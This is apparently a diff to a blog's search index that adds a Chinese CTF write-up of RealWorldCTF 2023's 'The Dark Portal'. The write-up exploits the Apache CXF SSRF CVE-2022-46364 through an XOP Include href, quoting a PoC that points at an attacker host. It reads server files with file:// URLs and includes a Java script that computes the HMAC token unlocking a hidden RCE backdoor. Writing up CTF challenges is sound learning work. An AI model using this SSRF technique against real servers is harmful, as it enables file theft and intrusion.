@@ -1666,6 +1666,93 @@ y_3=k(x_1-x_3)-y_1</script><script type="math/tex; mode=display">
 <p>装完之后正常导入插件即可使用，可能就是一个爆搜+剪枝的插件，不知道污点分析做的如何。</p>
 <p><img src="/2022/12/01/neo4j-tabby%E5%AD%A6%E4%B9%A0/assets/image-20221201162710915.png" alt="image-20221201162710915"></p>
 <p>先摆一会。</p>
+<h2 id="现有利用链覆盖"><a href="#现有利用链覆盖" class="headerlink" title="现有利用链覆盖"></a>现有利用链覆盖</h2><p>由于我只是扫了cc3.2.1的，就先把这部分弄了</p>
+<p>发现了需要在后面加上limit 10否则会在tostring的那类alias的地方卡死，大概是neo4j底层的实现吧。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>rwctf2023</title>
+    <url>/2023/01/13/rwctf2023/</url>
+    <content><![CDATA[<p>又是一年一度的RWCTF，这次不算坐牢局，全是观光局。全程OBr3kapig的巨佬们秒题，文档能看懂个大概，思路有的还能跟上，但难耐大佬秒的速度太快了，呜呜呜。</p>
+<span id="more"></span>
+<h1 id="RealWorldCTF2023"><a href="#RealWorldCTF2023" class="headerlink" title="RealWorldCTF2023"></a>RealWorldCTF2023</h1><h2 id="The-Dark-Portal"><a href="#The-Dark-Portal" class="headerlink" title="The Dark Portal"></a>The Dark Portal</h2><p>感觉这个题有点0ctf2022tomcat的ajp走私+幽灵猫组合洞的题，前半段是基于题目信息和黑盒打day。</p>
+<p>首先访问题目会返回给我们一段wsdl，很好，我也不知道这是啥，简单搜搜是干啥的：</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7541#toc-1">浅析接口安全之WebService - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://www.cnblogs.com/hoojjack/p/6724659.html">Apache CXF 入门详解 - 想总结却停留不前？ - 博客园 (cnblogs.com)</a></p>
+<p>Web服务(WebService)是一种<strong>跨语言</strong>和<strong>跨平台</strong>的远程调用(RPC)技术</p>
+<p>SOAP = http协议 + XML数据格式</p>
+</blockquote>
+<p>所以说那个xml应该就是告诉我们这个题通过soap的传参方式，那是不是我还得学一下咋肉眼理解这个xml呢？无所谓，burp的插件wsdler会出手。可以看出，插件为我们自动翻译出了对应的请求包，我们只需要修改<code>arg0</code>字段里面的字符串即可实现传参。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230113165222102.png" alt="image-20230113165222102"></p>
+<p>接下来就是找对应的day了。简单搜索了一下2022年关于apache cxf的CVE，最新的有两个：</p>
+<ul>
+<li><a href="https://www.cvedetails.com/cve/CVE-2022-46364/">CVE-2022-46364</a> 一个SSRF的洞</li>
+<li><a href="https://www.cvedetails.com/cve/CVE-2022-46363/">CVE-2022-46363</a> 一个列目录的洞</li>
+</ul>
+<p>我们看<code>portal.jsp</code>里藏有一个这样的路由：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   $.ajax(&#123;</span><br><span class="line">       <span class="attr">url</span>: <span class="string">&quot;7he_d4rk_p0rt4l&quot;</span>,</span><br><span class="line">       <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">       <span class="attr">success</span>: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;#voice&quot;</span>).html(data);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>我们可以利用的就是读到源码，看看这个<code>7he_d4rk_p0rt4l</code>在做什么，所以着手CVE-2022-46364。</p>
+<h3 id="CVE-2022-46364"><a href="#CVE-2022-46364" class="headerlink" title="CVE-2022-46364"></a>CVE-2022-46364</h3><p>可以搜到以下资料：</p>
+<blockquote>
+<p>直接给的不完整poc：<a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECXF-3168315">Server-side Request Forgery (SSRF) in org.apache.cxf:cxf-core | CVE-2022-46364 | Snyk</a></p>
+<p>PR修改：<a href="https://github.com/apache/cxf/pull/960">CXF-8706: CXF MTOM handler allow content injection by reta · Pull Request #960 · apache/cxf (github.com)</a></p>
+<p>代码修改部分：<a href="https://github.com/apache/cxf/commit/27813a0523e1b4ab7cccd980ef63d7249627f4e8">CXF-8706: CXF MTOM handler allow content injection (#960) · apache/cxf@27813a0 (github.com)</a></p>
+</blockquote>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114103407249.png" alt="image-20230114103407249"></p>
+<p>可以看到原来进到else分支就直接return一个URLDATASource了，现在修改了，新增了一个配置项<code>ATTACHMENT_XOP_FOLLOW_URLS_PROPERTY</code>,如果有才会去加载，否则就不会。可以确定这部分是在修补SSRF部分。</p>
+<p>再结合刚才网站给出的POC：<code>&lt;stringvalue&gt;&lt;inc:Include href=&quot;http://attackers.site/exploit/payload&quot; xmlns:inc=&quot;http://www.w3.org/2004/08/xop/include&quot;/&gt;&lt;stringvalue&gt;</code>可以看出来，是xop中的include命名空间的href存在SSRF。当然这个poc是不完整的，我们去官方文档看看xop的具体用法：<a href="https://www.ibm.com/docs/en/cics-ts/5.3?topic=data-mtomxop-soap">MTOM/XOP and SOAP - IBM Documentation</a></p>
+<p>英文实在是太差，再加上本身对xml不太了解，读了两次才知道在干啥：MTOM/XOP是用来优化SOAP数据包大小的，原本附件要通过base64放在标签里，但有xop的引入，就可以通过boundary分割，把附件放在一个单独的块中，有一个唯一标识<code>content-id</code>，xop标签依旧在soap里，但xop的include的href就可以引用刚才的<code>content-id</code>，这样的效果就是发送的数据包的大小得到了优化，不必用base64编码传输了。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114104152284.png" alt="image-20230114104152284"></p>
+<p>复现上述操作即可，将wsdler插件帮我们翻译的soap套在上面的请求头里（<code>content-type</code>也要改），修改href为我们的ssrf目标，可以任意文件读了，另外，java里面的file协议如果指定目录的话还能列目录，十分的方便，于是我们直接写脚本读取<code>file:///opt/tomcat/webapps/ROOT.war</code>。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230113170039476.png" alt="image-20230113170039476"></p>
+<p>然后我们准备分析这个文件，看到了一个52K的class文件<code>DarkMagic.class</code>，拖到jd-gui里长这样：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114105517878.png" alt="image-20230114105517878"></p>
+<p>我表示理解不能，然后拖到idea里尝试反编译直接加载不出来，所以这个题到后半段就变成了逆向题。于是先要搭环境来动调。web手就用idea来动调了。</p>
+<h3 id="IDEA搭建tomcat部署war包动调环境"><a href="#IDEA搭建tomcat部署war包动调环境" class="headerlink" title="IDEA搭建tomcat部署war包动调环境"></a>IDEA搭建tomcat部署war包动调环境</h3><p>简单写一下吧，本来挺简单一个事被idea坑了一个多小时。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/qq_57740280/article/details/124246962?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-124246962-blog-124291816.pc_relevant_recovery_v2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-124246962-blog-124291816.pc_relevant_recovery_v2&amp;utm_relevant_index=1">(47条消息) idea 怎么导入war包，idea怎么打开war包，idea怎么导出一个war包_idea导入war包项目_我想要德玛西亚的博客-CSDN博客</a></p>
+</blockquote>
+<ul>
+<li><p>新建项目的时候模板选用Web应用程序，应用程序服务器选择我们之前的tomcat服务器。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114115322403.png" alt="image-20230114115322403"></p>
+</li>
+<li><p>在这里我们可以在<code>Apache CXF XML Web Service</code>打上勾，这里打不打勾的区别在于项目的pom.xml会不会自动帮你把cxf相关依赖放上来，在这个题里，META-INF里的pom.xml直接复制即可，所以打不打勾无所谓。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114115457982.png" alt="image-20230114115457982"></p>
+</li>
+<li><p>之后项目会生成一个经典的<code>src</code>文件夹里面装着默认的serlvet以及index.jsp，一定要<strong>全部删掉</strong>，否则会影响后续部署。</p>
+</li>
+<li><p>把我们的war包解压，应该会解压成<code>META-INF</code>，<code>WEB-INF</code>以及其他jsp的文件，都放到一个文件夹里，就暂且称这个文件夹为<code>webapp</code>，然后扔到项目文件夹里，在项目结构的<code>module</code>里将<code>webapp</code>文件夹设为Web模块部署描述符，将<code>META-INF</code>里的<code>pom.xml</code>内容复制到这个项目根目录下的<code>pom.xml</code></p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114120008814.png" alt="image-20230114120008814"></p>
+</li>
+<li><p>然后理论上直接运行就可以了，IDEA会直接把webapp里的文件复制到<code>target</code>文件夹里，然后再通过tomcat一系列后续部署扔到tomcat上就可以运行了。</p>
+</li>
+</ul>
+<p>原则上面就ok了，但实际中我一直是404，不太理解，经过各种折磨后发现了问题，在这里说一下是IDEA将<code>webapp</code>文件夹移到<code>target</code>文件夹时候文件命名出了一些bug，比如文件夹套娃，起了一个叫<code>web.xml</code>的文件夹（？？？ 迷惑行为），我在<code>target</code>文件夹下进行了手动调整才能成功跑通，十分的痛苦。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114120641568.png" alt="image-20230114120641568"></p>
+<h3 id="结合jeb逆向分析"><a href="#结合jeb逆向分析" class="headerlink" title="结合jeb逆向分析"></a>结合jeb逆向分析</h3><p>s0uthwood说:”三分逆向，七分猜”。但是只看变量变化实在是太折磨了。真的没有那种nb一点的反编译的软件吗。然后在他的提醒下，打开了jeb，上一次打开还是一年前。一按tab，源码直接出现，jeb牛逼。这样就可以结合idea动调以及内存大概进行逆向分析了。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114110904054.png" alt="image-20230114110904054"></p>
+<p>在<code>TheDarkPortal</code>的<code>doGet</code>函数下断点，为<code>DarkMagic</code>的入口，然后先看看有哪些变量。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114120843139.png" alt="image-20230114120843139"></p>
+<p>看到了一堆静态变量，其中有一些我们能在前端回显到的中二英文，还有一些base64密文。</p>
+<p>结合jeb的反编译源码分析有一堆label进行goto跳转，同时还有一堆println作为干扰，我们F7和shift+F8交替使用，快速切换到我们想要的部分。这里最抽象的就是函数名和变量名，由I,{和换行符组成。动调一部分进入了这里，能猜到这里应该是进行DES解密：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114121353359.png" alt="image-20230114121353359"></p>
+<p>一通解完之后我们注意到invoke函数的静态变量有一个String数组多出来一个元素：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114121558416.png" alt="image-20230114121558416"></p>
+<p>能猜到刚刚就是在用des解密文还原明文，由于函数其实不是很多，我们很快就能在反编译的代码中找到对应代码：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114121856168.png" alt="image-20230114121856168"></p>
+<p>一眼丁真，这是就是在解DES，看到这个函数传了两个参数<code>arg13</code>和<code>arg14</code>，前者为还原的明文数组下标，后者是初始密钥。猜测刚刚是在还原4，再结合调用，很快搜到了调用处：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114122108102.png" alt="image-20230114122108102"></p>
+<p>很明显是这里是在解密文，我们把刚刚部分的代码抄过来手动还原能得到一系列明文，cmd，User-Agent,Victory or death!,The Argent Dawn等等，到后面还有HmacSHA256，runtime，exec等等。后面的代码框架有点像内存马打回显的部分，想必看到这应该就能猜出来干啥了：就是让你去改一系列请求头满足后就可以直接RCE了。</p>
+<p>所以重点关注if条件语句即可，结合动调，v1，v2字符串调用了getHeader，应该是对请求字段的字符串相等判断，v3相对复杂了一些，用了getParameter，应该是获取GET参数，之后进行了一个HmacSHA256的判断。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114122607549.png" alt="image-20230114122607549"></p>
+<p>其中在最后一个if这里卡住了，这里光看源码和动调并不知道是怎么将hmac输出的byte数组转为String再和get参数比较的，但我随便在那个位置按了一下tab，还原出对应的（这个叫汇编吗），看到了Base64Encoder，思路就很清晰了。</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114123039364.png" alt="image-20230114123039364"></p>
+<p>最后的exp:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] base64_str;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        base64_str = <span class="keyword">new</span> String[<span class="number">0x76</span>];</span><br><span class="line">        base64_str[<span class="number">0</span>] = <span class="string">&quot;0Ez0xGp13BQ6RMtXF5tAvqKzYLqqGvPf&quot;</span>;</span><br><span class="line">        base64_str[<span class="number">1</span>] = ***;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decode</span><span class="params">(<span class="keyword">int</span> arg13, <span class="keyword">long</span> arg14)</span> <span class="keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidKeySpecException, InvalidAlgorithmParameterException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> v2 = <span class="number">0x60L</span> ^ arg14 ^ <span class="number">0x3F40B9DFD534CF89L</span>;</span><br><span class="line">        Cipher v4 = Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        SecretKeyFactory v5 = SecretKeyFactory.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] v6 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        v6[<span class="number">0</span>] = (<span class="keyword">byte</span>) (((<span class="keyword">int</span>) (v2 &gt;&gt;&gt; <span class="number">56</span>)));</span><br><span class="line">        <span class="keyword">int</span> v0_3;</span><br><span class="line">        <span class="keyword">for</span> (v0_3 = <span class="number">1</span>; v0_3 &lt; <span class="number">8</span>; ++v0_3) &#123;</span><br><span class="line">            v6[v0_3] = (<span class="keyword">byte</span>) (((<span class="keyword">int</span>) (v2 &lt;&lt; v0_3 * <span class="number">8</span> &gt;&gt;&gt; <span class="number">56</span> &lt;&lt; arg13)));</span><br><span class="line">        &#125;</span><br><span class="line">        v4.init(<span class="number">2</span>, v5.generateSecret(<span class="keyword">new</span> DESKeySpec(v6)), <span class="keyword">new</span> IvParameterSpec(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>]));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(v4.doFinal(Base64.getDecoder().decode(base64_str[arg13])));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span> <span class="keyword">throws</span> UnsupportedEncodingException, InvalidKeyException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidKeySpecException </span>&#123;</span><br><span class="line">        String secret = decode(<span class="number">27</span>, <span class="number">0xE7327C51BB50A93EL</span>);</span><br><span class="line">        String message = decode(<span class="number">36</span>, <span class="number">0xE7327C51BB50A93EL</span>);</span><br><span class="line">        Mac sha256_HMAC = Mac.getInstance(<span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">        SecretKeySpec secretKey = <span class="keyword">new</span> SecretKeySpec(secret.getBytes(<span class="string">&quot;utf-8&quot;</span>), <span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">        sha256_HMAC.init(secretKey);</span><br><span class="line">        <span class="keyword">byte</span>[] hash = sha256_HMAC.doFinal(message.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(hash)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        encrypt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="/2023/01/13/rwctf2023/assets/image-20230114123224160.png" alt="image-20230114123224160"></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>我也不知道自己通过这个题学了啥，算是了解了简单的webservices，还有根据漏洞报告和github的修改部分以及官方文档复现CVE的过程，以及后续对java的逆向有了一些进步，但做出来还是很爽的。</p>
 ]]></content>
   </entry>
 </search>
